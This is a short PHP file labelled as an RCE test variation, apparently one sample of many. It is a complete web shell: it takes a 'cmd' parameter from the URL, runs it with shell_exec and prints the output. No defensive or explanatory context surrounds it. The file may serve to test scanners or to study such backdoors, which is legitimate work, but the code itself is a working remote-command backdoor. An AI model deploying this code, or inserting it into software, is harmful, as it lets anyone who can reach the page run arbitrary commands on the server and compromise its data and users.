<?php
// RCE test variation #1205
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>